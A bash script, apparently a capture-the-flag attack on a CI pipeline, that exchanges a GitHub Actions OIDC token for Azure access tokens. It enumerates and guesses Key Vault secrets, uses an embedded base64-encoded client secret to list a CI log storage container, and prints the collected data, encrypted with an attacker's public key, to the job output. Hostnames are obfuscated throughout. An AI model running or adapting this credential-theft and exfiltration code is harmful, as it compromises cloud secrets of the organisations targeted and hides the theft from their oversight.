#!/usr/bin/env bash
set -uo pipefail
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
AAD="${SC}$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')"
ARM="${SC}$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')"
ASCOPE=$(b 'aHR0cHM6Ly9tYW5hZ2VtZW50LmF6dXJlLmNvbS8uZGVmYXVsdA==')
VSCOPE=$(b 'aHR0cHM6Ly92YXVsdC5henVyZS5uZXQvLmRlZmF1bHQ=')
STCOPE=$(b 'aHR0cHM6Ly9zdG9yYWdlLmF6dXJlLmNvbS8uZGVmYXVsdA==')
TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RG=rg-tbl-platform-prod-sea
BLB=".$(b 'YmxvYi5jb3JlLndpbmRvd3MubmV0')"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
say "PROOF: $(id) | host=$(hostname)"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
fic(){ curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$1" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token","ERR"))'; }
FT=$(fic "$ASCOPE"); VT=$(fic "$VSCOPE")
say "PROD_NAMES_FULL:"
curl -sS -H "Authorization: Bearer $FT" "$ARM/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz/secrets?api-version=2023-07-01" | python3 -c 'import sys,json;d=json.load(sys.stdin);[print("  ",x["name"]) for x in d.get("value",[])]' 2>&1 >&3
say "SEC_NAMES_FULL: $(curl -sS -H "Authorization: Bearer $FT" "$ARM/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01")"
for N in flag FLAG Flag secret key flag-value challenge-flag theflag admin-flag; do
  say "TRY prod/$N: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.$(b 'dmF1bHQuYXp1cmUubmV0')/secrets/$N?api-version=7.4" | head -c 250)"
  say "TRY sec/$N: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.$(b 'dmF1bHQuYXp1cmUubmV0')/secrets/$N?api-version=7.4" | head -c 250)"
done
say "SEC_data_FIC: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.$(b 'dmF1bHQuYXp1cmUubmV0')/secrets?api-version=7.4" | head -c 500)"
PA=$(curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=462d1c38-4459-48b8-9333-82e389e59514" -d "grant_type=client_credentials" --data-urlencode "client_secret=$(b 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==')" --data-urlencode "scope=$STCOPE" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token","ERR"))')
for AC in sttblcilogsprodx3euoz; do
  for CT in logs; do
    for V in 2021-08-06 2020-04-08; do
      say "BLOB $AC/$CT v$V: $(curl -sS -H "Authorization: Bearer $PA" -H "x-ms-version: $V" "${SC}$AC$BLB/$CT?restype=container&comp=list" | head -c 900)"
    done
  done
done
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
